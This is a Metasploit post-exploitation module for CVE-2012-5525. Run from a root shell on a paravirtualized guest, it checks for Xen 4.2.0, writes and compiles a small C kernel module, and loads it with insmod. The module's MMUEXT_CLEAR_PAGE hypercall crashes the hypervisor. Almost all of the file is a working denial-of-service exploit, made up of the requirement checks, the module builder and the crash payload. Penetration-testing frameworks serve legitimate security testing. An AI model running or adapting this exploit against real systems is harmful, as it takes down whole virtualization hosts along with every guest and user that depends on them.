##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Linux::Priv
  include Msf::Post::Linux::System

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'         => 'Linux DoS Xen 4.2.0 2012-5525',
        'Description'  => %q(
        This module causes a hypervisor crash in Xen 4.2.0 when invoked from a
        paravirtualized VM, including from dom0.  Successfully tested on Debian 7
        3.2.0-4-amd64 with Xen 4.2.0.),
        'References'   => [ ['CVE', '2012-5525'] ],
        'License'      => MSF_LICENSE,
        'Author'       => [ 'Christoph Sendner <christoph.sendner[at]stud-mail.uni-wuerzburg.de>',
                            'Aleksandar Milenkoski  <aleksandar.milenkoski[at]uni-wuerzburg.de>'],
        'Platform'     => [ 'linux' ],
        'Arch'         => [ARCH_X64],
        #'Targets'      => [ ['Linux x86_64', { 'Arch' => ARCH_X64 } ] ],
        'SessionTypes' => ['shell']
      )
    )

    register_options(
      [
        OptString.new('WritableDir', [true, 'A directory for storing temporary files on the target system', '/tmp'])
      ], self.class
    )
  end

  def run
    # Variables
    @rand_folder = '/' + Rex::Text.rand_text_alpha(7 + rand(5)).to_s
    @writeable_folder = datastore['WritableDir'].to_s + @rand_folder

    # Testing requirements
    print_status('Detecting requirements...')
    return unless requirements_met?

    # Cearting and writing random paths and files
    vprint_status('Creating random file and folder names')
    write_files

    # Execute make and insmod
    do_insmod

    # Testing success of DoS
    test_success
  end

  ##
  # Test all requirements:
  #  - root-priviliges
  #  - build-essentials
  #  - xen-enviroment (existing, not running)
  #  - xen-running
  #  - xen-version (DoS only works on specific versions)
  ##

  def requirements_met?
    unless is_root?
      print_error("Root access is required")
      return false
    end
    print_good('Detected root privilege')

    unless build_essential?
      print_error('No build-essential package found')
      return false
    end
    print_good('Detected build-essential')

    unless xen?
      print_error('Running Xen was not found')
      return false
    end
    print_good('Detected Xen')

    unless xen_running?
      print_error('Xen is not running')
      return false
    end
    print_good('Detected running Xen')

    unless right_xen_version?
      print_error('Incorrect Xen version running')
      return false
    end
    print_good('Detected correct Xen version')

    true
  end

  ##
  # Checks for build essentials
  #  - Required for building a lkm
  #  - checks for gcc/g++, make and linux-headers
  #  - commands sh-conform
  ##

  def build_essential?
    check_command = 'if [ -s $( which gcc ) ] && '
    check_command << '[ -s $( which g++ ) ] && '
    check_command << '[ -s $( which make ) ] && '
    check_command << '[ "$( dpkg -l | grep linux-headers-$(uname -r) )" != "" ] ;'
    check_command << 'then echo OK;'
    check_command << 'fi'

    cmd_exec(check_command).delete("\r") == 'OK'
  end

  ##
  # Checks for running Xen Hypervisor
  #  - Looks for Xen in lsmod, lscpu, dmesg and /sys/bus
  #  - commands sh-conform
  ##

  def xen?
    check_command = 'if [ "$( lsmod | grep xen )" != "" ] || '
    check_command << '[ "$( lscpu | grep Xen )" != "" ] || '
    check_command << '[ "$( dmesg | grep xen )" != "" ] || '
    check_command << '[ "$( which xl )" != "" ] ;'
    check_command << 'then echo OK;'
    check_command << 'fi'

    cmd_exec(check_command).delete("\r") == 'OK'
  end

  ##
  # Checks for running Xen
  #  - Host eventually has Xen installed, but not running
  #  - DoS needs a running Xen on Host
  ##

  def xen_running?
    check_command = 'if [ -f /var/run/xenstored.pid -o -f /var/run/xenstore.pid ] ; then echo OK; fi'

    cmd_exec(check_command).delete("\r") == 'OK'
  end

  ##
  # Checks for Xen Version
  #  - Most DoS of Xen require a specific version - here: 4.2.0
  #  - commands need running Xen - so execute after test for xen
  ##

  def right_xen_version?
    cmd_major = "xl info | grep xen_major | grep -o '[0-9]*'"
    xen_major = cmd_exec(cmd_major).delete("\r")
    cmd_minor = "xl info | grep xen_minor | grep -o '[0-9]*'"
    xen_minor = cmd_exec(cmd_minor).delete("\r")
    cmd_extra = "xl info | grep xen_extra | grep -o '[0-9]*'"
    xen_extra = cmd_exec(cmd_extra).delete("\r")

    xen_version = xen_major + '.' + xen_minor + '.' + xen_extra

    print_status('Xen Version: ' + xen_version)

    xen_version == '4.2.0'
  end

  ##
  # Creating and writing files:
  #  - c_file for c-code
  #  - Makefile
  ##

  def write_files
    @c_name = Rex::Text.rand_text_alpha(7 + rand(5)).to_s
    @c_file = "#{@writeable_folder}/#{@c_name}.c"
    @make_file = "#{@writeable_folder}/Makefile"

    vprint_status("Creating folder '#{@writeable_folder}'")
    cmd_exec("mkdir #{@writeable_folder}")

    vprint_status("Writing C code to '#{@c_file}'")
    write_file(@c_file, c_code)
    vprint_status("Writing Makefile to '#{@make_file}'")
    write_file(@make_file, make_code)
  end

  ##
  # Compiling and execute LKM
  ##

  def do_insmod
    cmd_exec("cd #{@writeable_folder}")
    vprint_status('Making module...')
    cmd_exec('make')
    vprint_status("Insmod '#{@writeable_folder}/#{@c_name}.ko'")
    cmd_exec("insmod #{@writeable_folder}/#{@c_name}.ko")
  end

  ##
  # Test for success via ssh-error exception
  #  - Host down => ssh-error => DoS successful
  ##

  def test_success
    successful = false
    begin
      is_root?
    rescue RuntimeError => e
      successful = true if e.message == 'Could not determine UID: ""'
      raise unless successful
    ensure
      if successful
        print_good('DoS was successful!')
      else
        print_error('DoS has failed')
      end
    end
  end

  ##
  # Returns Makefile to compile
  #  - LKMs need a Makefile
  #  - Needs the linux-headers, make and gcc
  ##

  def make_code
    m = <<-END
obj-m := #{@c_name}.o

EXTRA_CFLAGS+= -save-temps

all:
\t$(MAKE) -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
\t$(MAKE) -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
    END
    m
  end

  ##
  # Returns the c-Code to compile
  #  - Contains the essential bug to crash Xen
  #  - Here: Force a segmentation fault via hypercall, which crashes the host
  ##

  def c_code
    c = <<-END
#undef __KERNEL__
#define __KERNEL__
#undef MODULE
#define MODULE
#include <linux/module.h>
#include <asm/xen/hypercall.h>
MODULE_LICENSE("GPL");
static int __init lkm_init(void)
{
struct mmuext_op op;
int status;
op.cmd = 16; /*MMUEXT_CLEAR_PAGE*/
op.arg1.mfn = 0x0EEEEE; /*A large enough MFN*/
HYPERVISOR_mmuext_op(&op, 1, &status, DOMID_SELF);
return 0;
}
static void __exit lkm_cleanup(void)
{
}
module_init(lkm_init);
module_exit(lkm_cleanup);
    END
    c
  end
end
